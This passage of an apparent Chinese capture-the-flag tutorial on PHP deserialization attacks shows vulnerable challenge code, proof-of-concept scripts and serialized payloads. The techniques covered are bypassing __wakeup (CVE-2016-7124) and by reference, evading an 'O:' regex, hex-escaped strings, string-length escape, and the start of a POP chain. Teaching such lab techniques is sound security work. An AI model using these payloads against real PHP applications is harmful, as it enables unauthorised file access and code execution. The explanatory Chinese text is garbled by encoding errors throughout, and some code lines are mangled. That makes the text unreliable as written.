class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Â class Test Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  </span><br><span class="line">Â &#123;</span><br><span class="line">Â  Â  Â private $test;</span><br><span class="line">Â  Â  Â public function __construct($test)&#123;</span><br><span class="line">Â  Â  Â  Â  Â $this-&gt;test = $test;</span><br><span class="line">Â  Â   &#125;</span><br><span class="line">Â &#125;</span><br><span class="line">Â $a = new Test(); </span><br><span class="line">Â $a-&gt;test=&#x27;phpinfo();&#x27;; Â  Â  Â  Â  Â //è¿™æ ·æ“ä½œæ˜¯ä¸è¡Œçš„</span><br><span class="line">Â echo urlencode(serialize($a)); </span><br></pre></td></tr></table></figure><hr><h2 id="CTFåº”ç”¨"><a href="#CTFåº”ç”¨" class="headerlink" title="CTFåº”ç”¨"></a>CTFåº”ç”¨</h2><hr><h4 id="åŸºç¡€æŠ€å·§"><a href="#åŸºç¡€æŠ€å·§" class="headerlink" title="åŸºç¡€æŠ€å·§"></a>åŸºç¡€æŠ€å·§</h4><hr><h5 id="wakeupç»•è¿‡"><a href="#wakeupç»•è¿‡" class="headerlink" title="__wakeupç»•è¿‡"></a>__wakeupç»•è¿‡</h5><p>(CVE-2016-7124)</p><h6 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h6><p>å½±å“ç‰ˆæœ¬ï¼š<strong>PHP&gt;5.6.25 ; PHP&lt;7.0.10</strong></p><p>wakeupåœ¨ä½¿ç”¨unserialize()æ—¶è‡ªåŠ¨è§¦å‘ï¼Œä¹Ÿå°±æ˜¯è¯´ä½†å‡¡æ¶‰åŠåˆ°ååºåˆ—åŒ–çš„æ“ä½œï¼Œéƒ½ä¼šå»æ‰§è¡Œwakeupçš„å†…å®¹ï¼Œå¦‚æœé‡Œé¢çš„å†…å®¹å¯¹æˆ‘ä»¬ä¸å‹å¥½ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªcveå¯¹å…¶è¿›è¡Œç»•è¿‡</p><p>Â å½“åºåˆ—åŒ–å­—ç¬¦ä¸²è¡¨ç¤ºå¯¹è±¡å±æ€§ä¸ªæ•°çš„å€¼å¤§äºçœŸå®ä¸ªæ•°çš„å±æ€§æ—¶å°±ä¼šè·³è¿‡__wakeupçš„æ‰§è¡Œã€‚</p><h6 id="å®ä¾‹"><a href="#å®ä¾‹" class="headerlink" title="å®ä¾‹"></a>å®ä¾‹</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Â &lt;?php</span><br><span class="line">Â  Â  Â class xctf&#123;</span><br><span class="line">Â  Â  Â public $flag = &#x27;111&#x27;;</span><br><span class="line">Â  Â  Â public function __wakeup()&#123;</span><br><span class="line">Â  Â  Â  Â  Â exit(&#x27;bad requests&#x27;);</span><br><span class="line">Â  Â   &#125;</span><br><span class="line">Â  Â  Â ?code=</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬çš„ç›®çš„æ˜¯ä¸èƒ½è¿›å…¥wakeupå¦åˆ™å°±ç›´æ¥exitäº†ã€‚</p><p>å…ˆæ„é€ poc</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Â &lt;?php</span><br><span class="line">Â  Â  Â class xctf&#123;</span><br><span class="line">Â  Â  Â public $flag = &#x27;111&#x27;;</span><br><span class="line">Â  Â  Â public function __wakeup()&#123;</span><br><span class="line">Â  Â  Â exit(&#x27;bad requests&#x27;);</span><br><span class="line">Â  Â   &#125;</span><br><span class="line">Â  Â   &#125;</span><br><span class="line">Â  Â  Â $a = new xctf();</span><br><span class="line">Â  Â  Â echo serialize($a);</span><br><span class="line">Â ?&gt;</span><br></pre></td></tr></table></figure><p>å¾—åˆ°ï¼š<code>O:4:&quot;xctf&quot;:1:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</code></p><p>å¦‚æœæˆ‘ä»¬ç°åœ¨ç›´æ¥ä¼ è¿™ä¸ªå°±ä¼šè¿›å…¥wakeupï¼Œæ‰€ä»¥è¦ç»•è¿‡å®ƒï¼Œå…·ä½“æ–¹æ³•å°±æ˜¯æŠŠæœ€åçš„é‚£ä¸ª3æ”¹æˆ4ï¼ŒæŠŠå¤–é¢çš„é‚£ä¸ª1æ”¹æˆ2.éƒ½å¯ä»¥ç»•è¿‡ã€‚</p><hr><h5 id="ç»•è¿‡éƒ¨åˆ†æ­£åˆ™"><a href="#ç»•è¿‡éƒ¨åˆ†æ­£åˆ™" class="headerlink" title="ç»•è¿‡éƒ¨åˆ†æ­£åˆ™"></a>ç»•è¿‡éƒ¨åˆ†æ­£åˆ™</h5><p>æœ€å¸¸è§çš„ä¸€ç§æ­£åˆ™æ˜¯<code>preg_match(&#39;/^O:\d+/&#39;)</code>å¤§æ¦‚æ„æ€æ˜¯åŒ¹é…å¯¹è±¡å­—ç¬¦ä¸²æ˜¯ä¸æ˜¯<code>O:</code>å¼€å¤´:ç„¶åè·Ÿä¸€ä¸ªæ•°å­—ã€‚</p><p>ç»•è¿‡</p><ul><li>ä¸€ä¸ªå¾ˆç®€å•çš„ç»•è¿‡æ‰‹æ³•å°±æ˜¯åœ¨æ•°å­—å‰é¢åŠ ä¸€ä¸ª<code>+</code>ï¼Œè¿™æ ·å°±ç»•è¿‡æ­£åˆ™ã€‚æ­£å¸¸æ¥è¯´æ­£æ•°ä¼šçœç•¥<code>+</code>ï¼Œä½†æ˜¯åŠ ä¸Šä¹Ÿä¸ç®—é”™ã€‚<code>O:4:&quot;xctf&quot;:1:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</code>å˜æˆ<code>O:+4:&quot;xctf&quot;:1:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</code></li><li>serialize(array(a)) aæ˜¯è¦ååºåˆ—åŒ–çš„å¯¹è±¡(è¿™æ ·æˆ‘ä»¬åºåˆ—åŒ–çš„å¼€å¤´å°±ä¸æ˜¯Oè€Œæ˜¯a,ä½†åŒæ—¶åˆä¸å½±å“ä½œä¸ºæ•°ç»„å…ƒç´ çš„$açš„ææ„)</li></ul><hr><h5 id="åˆ©ç”¨å¼•ç”¨ç»•è¿‡"><a href="#åˆ©ç”¨å¼•ç”¨ç»•è¿‡" class="headerlink" title="åˆ©ç”¨å¼•ç”¨ç»•è¿‡"></a>åˆ©ç”¨å¼•ç”¨ç»•è¿‡</h5><p>æ¨èåšå®¢ï¼š<a href="https://inhann.top/2022/05/17/bypass_wakeup/">https://inhann.top/2022/05/17/bypass_wakeup&#x2F;</a></p><blockquote><p>ä»‹ç»ä¸€ä¸ªé€šç”¨çš„æ–°æ€è·¯ï¼Œç”¨ä»¥ç»•è¿‡ pop chain æ„é€ è¿‡ç¨‹ä¸­é‡åˆ°çš„ __wakeup()</p></blockquote><p>è¿™é€‚ç”¨äºé«˜ç‰ˆæœ¬çš„PHPä¸­ï¼Œæ­¤æ—¶ä¼ ç»Ÿçš„__wakeupç»•è¿‡ä¸èµ·ä½œç”¨ã€‚</p><blockquote><p>åŸç†ï¼š</p><p>a&#x3D;1;</p><p>b&#x3D;&a;</p><p>a&#x3D;a+1;</p><p>é‚£ä¹ˆæœ€åbå¾—å€¼ä¹Ÿä¼šå˜ä¸º2ï¼Œå› ä¸ºbæ˜¯å¼•ç”¨èµ‹å€¼ï¼Œbå­˜æ”¾çš„æ˜¯açš„åœ°å€ï¼Œaæ”¹å˜ã€‚bçš„åœ°å€æ²¡å˜ä½†æ˜¯åœ°å€å¯¹åº”çš„å€¼æ”¹å˜ï¼Œä¹Ÿå°±æ˜¯bæ”¹å˜äº†ã€‚åŒç†æ”¹å˜äº†bä¹Ÿå°±æ˜¯é€šè¿‡bæ‰¾åˆ°açš„å€¼æŠŠå®ƒä¿®æ”¹äº†ï¼Œæ‰€ä»¥ä¿®æ”¹bï¼Œaä¹Ÿä¿®æ”¹äº†ã€‚</p></blockquote><p>åœ¨ååºåˆ—åŒ–ä¸­åŒç†ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Â $b = new Flag(&#x27;flag.php&#x27;);</span><br><span class="line">Â $b-&gt;token=&amp;$B-&gt;token_flag; Â  Â  Â //ä½¿å¾—tokenå§‹ç»ˆç­‰äºtoken_flag</span><br><span class="line">Â $a = new Handle($b);</span><br></pre></td></tr></table></figure><p>çœç•¥ä¸€äº›å…¶ä»–æ¡ä»¶ï¼Œå¾—åˆ°payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Â O:6:&quot;Handle&quot;:1:&#123;s:14:&quot;Handlehandle&quot;;O:4:&quot;Flag&quot;:3:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;s:5:&quot;token&quot;;s:32:&quot;0b794a03744a03800313ca0f2e291294&quot;;s:10:&quot;token_flag&quot;;R:4;&#125;&#125;</span><br></pre></td></tr></table></figure><p>éœ€è¦æ³¨æ„çš„å°±æ˜¯è¿™ä¸ªRï¼Œè¿™å°±æ˜¯ç±»ä¼¼æŒ‡é’ˆçš„å¼•ç”¨çš„å¯¹åº”å­—ç¬¦ã€‚</p><p>e.g:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">Â &lt;?php</span><br><span class="line">Â highlight_file(&quot;1.php&quot;);</span><br><span class="line">Â class File&#123;</span><br><span class="line">Â public $filename;</span><br><span class="line">Â public $secret;</span><br><span class="line">Â public function __construct($filename,$secret)&#123;</span><br><span class="line">Â $this-&gt;filename=$filename;</span><br><span class="line">Â $this-&gt;secret=$secret;</span><br><span class="line">Â &#125;</span><br><span class="line">Â public function __wakeup()</span><br><span class="line">Â &#123; Â  $this-&gt;filename=&quot;nonoflag&quot;;</span><br><span class="line">Â if(isset($_GET[&#x27;secret&#x27;])) &#123;</span><br><span class="line">Â $this-&gt;secret = $_GET[&#x27;secret&#x27;];</span><br><span class="line">Â &#125;</span><br><span class="line">Â &#125;</span><br><span class="line">Â â€‹</span><br><span class="line">Â public function __destruct()</span><br><span class="line">Â &#123;</span><br><span class="line">Â //@include($this-&gt;filename);</span><br><span class="line">Â  Â  Â echo $this-&gt;filename;</span><br><span class="line">Â  Â  Â if ($this-&gt;filename == &#x27;flag.php&#x27;)&#123;</span><br><span class="line">Â  Â  Â  Â  Â echo &#x27;You get the flag!&#x27;;</span><br><span class="line">Â &#125;</span><br><span class="line">Â &#125;</span><br><span class="line">Â &#125;</span><br><span class="line">Â â€‹</span><br><span class="line">Â if(isset($_GET[&#x27;flag&#x27;]))&#123;</span><br><span class="line">Â $flag = $_GET[&#x27;flag&#x27;];</span><br><span class="line">Â unserialize($flag);</span><br><span class="line">Â &#125;</span><br></pre></td></tr></table></figure><p>æ€è·¯ï¼š</p><ul><li>è¿™ä¸ªé¢˜éœ€è¦ç»•è¿‡wakeupé‡Œé¢çš„filename&#x3D;nonoflagè¿™æ¡è¯­å¥ï¼Œä½†æ˜¯PHPç‰ˆæœ¬è¿‡é«˜ï¼Œå¸¸è§„ç»•è¿‡ä¸è¡Œ</li><li>è€ƒè™‘å¼•ç”¨ç»•è¿‡ï¼Œå› ä¸ºwakeupé‡Œé¢å…è®¸getä¼ å‚ä¼ å…¥secretï¼Œæ‰€ä»¥æˆ‘ä»¬ç”¨å¼•ç”¨æ“ä½œè®©<code>$this-&gt;$secret=&amp;$this-&gt;$filename;</code>ï¼Œè¿™æ ·filenameå°±ä¸€ç›´ç­‰äºsecretï¼Œç„¶ågetä¼ secretç­‰äºflag.phpã€‚å®ç°ä¸wakeupçš„å¯¹å†²</li><li>ä»è€Œè®©<code>filename=flag.php</code></li></ul><p>poc:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Â &lt;?php</span><br><span class="line">Â class File&#123;</span><br><span class="line">Â  Â  Â public $filename;</span><br><span class="line">Â  Â  Â public $secret;</span><br><span class="line">Â &#125;</span><br><span class="line">Â $a = new File();</span><br><span class="line">Â $a-&gt;secret=&amp;$a-&gt;filename;</span><br><span class="line">Â echo urlencode(serialize($a)); Â //O:4:&quot;File&quot;:2:&#123;s:8:&quot;filename&quot;;N;s:6:&quot;secret&quot;;R:2;&#125;</span><br></pre></td></tr></table></figure><p>æœ€ç»ˆpayloadï¼š</p><ul><li>getä¼ å‚ï¼š<code>O:4:&quot;File&quot;:2:&#123;s:8:&quot;filename&quot;;N;s:6:&quot;secret&quot;;R:2;&#125;</code>[urlç¼–ç ä¹‹åçš„]</li><li>secretä¼ <code>flag.php</code></li></ul><hr><h5 id="åå…­è¿›åˆ¶ç»•è¿‡å­—ç¬¦çš„è¿‡æ»¤"><a href="#åå…­è¿›åˆ¶ç»•è¿‡å­—ç¬¦çš„è¿‡æ»¤" class="headerlink" title="åå…­è¿›åˆ¶ç»•è¿‡å­—ç¬¦çš„è¿‡æ»¤"></a>åå…­è¿›åˆ¶ç»•è¿‡å­—ç¬¦çš„è¿‡æ»¤</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Â O:4:&quot;test&quot;:2:&#123;s:4:&quot;%00*%00a&quot;;s:3:&quot;abc&quot;;s:7:&quot;%00test%00b&quot;;s:3:&quot;def&quot;;&#125;</span><br><span class="line">Â å¯ä»¥å†™æˆ</span><br><span class="line">Â O:4:&quot;test&quot;:2:&#123;S:4:&quot;\00*\00\61&quot;;s:3:&quot;abc&quot;;s:7:&quot;%00test%00b&quot;;s:3:&quot;def&quot;;&#125;</span><br><span class="line">Â è¡¨ç¤ºå­—ç¬¦ç±»å‹çš„så¤§å†™æ—¶ï¼Œä¼šè¢«å½“æˆ16è¿›åˆ¶è§£æã€‚</span><br></pre></td></tr></table></figure><hr><h4 id="PHPååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸"><a href="#PHPååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸" class="headerlink" title="PHPååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸"></a>PHPååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸</h4><p>æ­¤ç±»é¢˜ç›®çš„æœ¬è´¨å°±æ˜¯æ”¹å˜åºåˆ—åŒ–å­—ç¬¦ä¸²çš„é•¿åº¦ï¼Œå¯¼è‡´ååºåˆ—åŒ–æ¼æ´ è¿™ç§é¢˜ç›®æœ‰ä¸ªå…±åŒç‚¹ï¼š</p><ul><li>phpåºåˆ—åŒ–åçš„å­—ç¬¦ä¸²ç»è¿‡äº†æ›¿æ¢æˆ–è€…ä¿®æ”¹ï¼Œå¯¼è‡´å­—ç¬¦ä¸²é•¿åº¦å‘ç”Ÿå˜åŒ–ã€‚</li><li>æ€»æ˜¯<strong>å…ˆè¿›è¡Œåºåˆ—åŒ–</strong>ï¼Œå†è¿›è¡Œæ›¿æ¢ä¿®æ”¹æ“ä½œã€‚</li></ul><hr><h6 id="è¿‡æ»¤åå­—ç¬¦å˜å¤š"><a href="#è¿‡æ»¤åå­—ç¬¦å˜å¤š" class="headerlink" title="è¿‡æ»¤åå­—ç¬¦å˜å¤š"></a>è¿‡æ»¤åå­—ç¬¦å˜å¤š</h6><p>ä¾‹é¢˜ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Â &lt;?php</span><br><span class="line">Â function filter($str)&#123;</span><br><span class="line">Â  Â  Â return str_replace(&#x27;bb&#x27;, &#x27;ccc&#x27;, $str);</span><br><span class="line">Â &#125;</span><br><span class="line">Â class A&#123;</span><br><span class="line">Â  Â  Â public $name=&#x27;aaaa&#x27;;</span><br><span class="line">Â  Â  Â public $pass=&#x27;123456&#x27;;</span><br><span class="line">Â &#125;</span><br><span class="line">Â $AA=new A();</span><br><span class="line">Â  echo serialize($AA).&quot;\n&quot;;$res=filter(serialize($AA));</span><br><span class="line">Â $c=unserialize($res);</span><br><span class="line">Â echo $c-&gt;pass;</span><br><span class="line">Â echo &#x27;&lt;/br&gt;&#x27;;</span><br><span class="line">Â echo $c-&gt;name;</span><br><span class="line">Â ?&gt;</span><br></pre></td></tr></table></figure><p>åˆ†æï¼š</p><ul><li>æŠŠbbæ¢æˆcccï¼Œå­—ç¬¦ä¸²å°±é•¿äº†ï¼Œä½†æ˜¯å­—ç¬¦ä¸²é•¿åº¦åœ¨filterå‡½æ•°è¿›è¡Œå‰å°±ç¡®å®šå¥½äº†ï¼Œã€æ ¹æ®åŸæ¥æ˜¯bbçš„æ—¶å€™å°±ç¡®å®šäº†ã€‘</li><li>è¿™ä¸ªæ—¶å€™æˆ‘ä»¬æ¯æ„é€ ä¸€ä¸ªbbï¼Œè®¾å®šçš„å­—ç¬¦ä¸²é•¿åº¦å°±ä¼šæ¯”å®é™…çš„å­—ç¬¦ä¸²å°‘ä¸€ä¸ªï¼Œä¹Ÿå°±æ˜¯nameä¸­æœ‰ä¸€ä¸ªå­—ç¬¦é€ƒé€¸å‡ºæ¥äº†</li><li>å¦‚æœæˆ‘ä»¬å°è¯•å…ˆå¯¹nameçš„å€¼è¿›è¡Œé—­åˆ<code>&quot;;&#125;</code>ï¼Œç„¶åæ„é€ ä¸€ä¸‹å°±èƒ½ä¿®æ”¹passçš„å€¼ï¼Œä½¿å¾—é€šè¿‡æ„é€ nameæ¥å–ä¿®æ”¹äº†pass</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Â &lt;?php</span><br><span class="line">Â function filter($str)&#123;</span><br><span class="line">Â  Â  Â return str_replace(&#x27;bb&#x27;, &#x27;ccc&#x27;, $str);</span><br><span class="line">Â &#125;</span><br><span class="line">Â class A&#123;</span><br><span class="line">Â  Â  Â public $name=&#x27;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;&#125;&#x27;;</span><br><span class="line">Â  Â  Â public $pass=&#x27;123456&#x27;;</span><br><span class="line">Â &#125;</span><br><span class="line">Â $AA=new A();</span><br><span class="line">Â  echo serialize($AA).&quot;\n&quot;;$res=filter(serialize($AA));</span><br><span class="line">Â $c=unserialize($res);</span><br></pre></td></tr></table></figure><p>åˆ†æï¼š</p><ul><li>ç»è¿‡filterä¹‹å‰ï¼š<code>O:1:&quot;A&quot;:2:&#123;s:4:&quot;name&quot;;s:81:&quot;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;&#125;&quot;;s:4:&quot;pass&quot;;s:6:&quot;123456&quot;;&#125;</code> 27*2å’ŒbåŠ 27ä¸ªå…¶ä»–çš„â€˜â€œ;s:4:â€passâ€;s:6:â€hackerâ€;}â€™</li><li>è¿™ä¸ªè¿˜æ˜¯æ­£å¸¸çš„ï¼Œç„¶åæˆ‘ä»¬æŠŠbbæ¢æˆcccï¼Œç„¶å81å¯¹åº”çš„å­—ç¬¦ä¸²å°±æ˜¯27*3&#x3D;81ä¸ªcï¼Œ<code> `O:1:&quot;A&quot;:2:&#123;s:4:&quot;name&quot;;s:81:&quot;ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc&quot;`;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;&#125;&quot;`;s:4:&quot;pass&quot;;s:6:&quot;123456&quot;;&#125;</code></li><li>æˆåŠŸé€ƒé€¸å‡ºæ¥ï¼Œå‰©ä¸‹çš„å…³äºpassçš„è¢«é—­åˆä¸¢æ‰äº†</li></ul><h6 id="è¿‡æ»¤åå­—ç¬¦å˜å°‘"><a href="#è¿‡æ»¤åå­—ç¬¦å˜å°‘" class="headerlink" title="è¿‡æ»¤åå­—ç¬¦å˜å°‘"></a>è¿‡æ»¤åå­—ç¬¦å˜å°‘</h6><p>demo:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Â &lt;?php</span><br><span class="line">Â function str_rep($string)&#123;</span><br><span class="line">Â     return preg_replace( &#x27;/phptest/&#x27;,&#x27;&#x27;, $string);</span><br><span class="line">Â &#125;</span><br><span class="line">Â â€‹</span><br><span class="line">Â $test[&#x27;name&#x27;] = $_GET[&#x27;name&#x27;];</span><br><span class="line">Â $test[&#x27;sign&#x27;] = $_GET[&#x27;sign&#x27;]; </span><br><span class="line">Â $test[&#x27;number&#x27;] = &#x27;2020&#x27;;</span><br><span class="line">Â $temp = str_rep(serialize($test));</span><br><span class="line">Â printf($temp);</span><br><span class="line">Â $fake = unserialize($temp);</span><br><span class="line">Â echo &#x27;&lt;br&gt;&#x27;;</span><br><span class="line">Â print(&quot;name:&quot;.$fake[&#x27;name&#x27;].&#x27;&lt;br&gt;&#x27;);</span><br><span class="line">Â print(&quot;sign:&quot;.$fake[&#x27;sign&#x27;].&#x27;&lt;br&gt;&#x27;);</span><br><span class="line">Â print(&quot;number:&quot;.$fake[&#x27;number&#x27;].&#x27;&lt;br&gt;&#x27;);</span><br><span class="line">Â ?&gt;</span><br></pre></td></tr></table></figure><p>åˆ†æï¼š</p><ul><li>æŠŠ&#x2F;phptest&#x2F;æ¢æˆç©ºï¼Œé€ æˆå­—ç¬¦å˜å°‘ã€‚</li><li>æˆ‘ä»¬é€šè¿‡æ„é€ nameå’Œsignæ¥æ”¹å˜numberï¼Œåè€…signçš„å€¼ã€‚</li><li>Â $name&#x3D;â€™testtesttesttesttesttestâ€™<br>Â $sign&#x3D;â€™helloâ€;s:4:â€signâ€;s:4:â€evalâ€;s:6:â€numberâ€;s:4:â€evalâ€;}â€™<br>Â $number&#x3D;2023<br>Â &#x2F;&#x2F;æœ€ç»ˆï¼š<br>Â name:â€™â€;s:4:â€signâ€;s:54:â€helloâ€™<br>Â sign:â€™evalâ€™<br>Â number:â€™evalâ€™</li><li>è¿™ä¸ªæ—¶å€™nameå‰é¢çš„å­—ç¬¦æ•°é‡æœ¬æ¥æ˜¯24ï¼Œä½†æ˜¯nameæ­¤æ—¶ä¸ºç©ºï¼Œä¹Ÿå°±æ˜¯æŠŠsignåé¢çš„å‰é¢å‡ ä½ä¹ŸåŒ…è¿›å»äº†</li><li>æ„é€ é—­åˆä¹‹å<code>&quot;;</code>ä½œä¸ºç»“å°¾ï¼Œå†æ„é€ åé¢çš„å€¼ï¼Œå»æ”¹å˜signæˆ–è€…numberéƒ½å¯ä»¥</li><li>å…³é”®å°±æ˜¯è¿™ä¸ªå­—ç¬¦å‡å°‘ï¼Œç¬¬ä¸€ä¸ªè®¾å®šå­—ç¬¦æ•°å°±å¤§äºå®é™…å­—ç¬¦æ•°ï¼Œå°±ä¼šæŠŠç¬¬äºŒä¸ªå­—ç¬¦ä¹ŸåŒ…è¿›å»ï¼Œå°±æŠŠç¬¬äºŒä¸ªçš„å­—ç¬¦æ•°åŒ…è¿›å»äº†ï¼Œé‚£ä¸ªç¬¬äºŒä¸ªç”šè‡³åé¢çš„å­—ç¬¦æ•°ï¼Œå­—ç¬¦å†…å®¹éƒ½å¯ä»¥è‡ªå·±æ„é€ äº†!</li></ul><hr><h4 id="popé“¾çš„åˆ©ç”¨"><a href="#popé“¾çš„åˆ©ç”¨" class="headerlink" title="popé“¾çš„åˆ©ç”¨"></a>popé“¾çš„åˆ©ç”¨</h4><hr><p>ç›´æ¥çœ‹ä¾‹é¢˜ï¼š</p><h5 id="é¢˜ç›®ä¸€"><a href="#é¢˜ç›®ä¸€" class="headerlink" title="é¢˜ç›®ä¸€"></a>é¢˜ç›®ä¸€</h5><h6 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">Â error_reporting(0);</span><br><span class="line">Â show_source(&quot;index.php&quot;);</span><br><span class="line">Â â€‹</span><br><span class="line">Â class w44m Â  Â  Â  Â c</span><br><span class="line">Â &#123;</span><br><span class="line">Â â€‹</span><br><span class="line">Â  Â  Â private $admin = &#x27;aaa&#x27;;</span><br><span class="line">Â  Â  Â protected $passwd = &#x27;123456&#x27;;</span><br><span class="line">Â â€‹</span><br><span class="line">Â  Â  Â public function Getflag()</span><br><span class="line">Â  Â   &#123;</span><br><span class="line">Â  Â  Â  Â  Â if ($this-&gt;admin === &#x27;w44m&#x27; &amp;&amp; $this-&gt;passwd === &#x27;08067&#x27;) &#123;</span><br><span class="line">Â  Â  Â  Â  Â  Â  Â include(&#x27;flag.php&#x27;);</span><br><span class="line">Â  Â  Â  Â  Â  Â  Â echo $flag;</span><br><span class="line">Â  Â  Â  Â   &#125; else &#123;</span><br><span class="line">Â  Â  Â  Â  Â  Â  Â echo $this-&gt;admin;</span><br><span class="line">Â  Â  Â  Â  Â  Â  Â echo $this-&gt;passwd;</span><br><span class="line">Â  Â  Â  Â  Â  Â  Â echo &#x27;nono&#x27;;</span><br><span class="line">Â  Â  Â  Â   &#125;</span><br><span class="line">Â  Â   &#125;</span><br><span class="line">Â &#125;</span><br><span class="line">Â â€‹</span><br><span class="line">Â class w22m Â  Â  Â  Â  Â  Â  a</span><br><span class="line">Â &#123;</span><br><span class="line">Â  Â  Â public $w00m;</span><br><span class="line">Â â€‹</span><br><span class="line">Â  Â  Â public function __destruct()</span><br><span class="line">Â  Â   &#123;</span><br><span class="line">Â  Â  Â  Â  Â echo $this-&gt;w00m;</span><br><span class="line">Â  Â   &#125;</span><br><span class="line">Â &#125;</span><br><span class="line">Â â€‹</span><br><span class="line">Â class w33m Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â b</span><br><span class="line">Â &#123;</span><br><span class="line">Â  Â  Â public $w00m;</span><br><span class="line">Â  Â  Â public $w22m;</span><br><span class="line">Â â€‹</span><br><span class="line">Â  Â  Â public function __toString()</span><br><span class="line">Â  Â   &#123;</span><br><span class="line">Â  Â  Â  Â  Â $this-&gt;w00m-&gt;&#123;$this-&gt;w22m&#125;();</span><br><span class="line">Â  Â  Â  Â  Â return 0;</span><br><span class="line">Â  Â   &#125;</span><br><span class="line">Â &#125;</span><br><span class="line">Â $w00m = 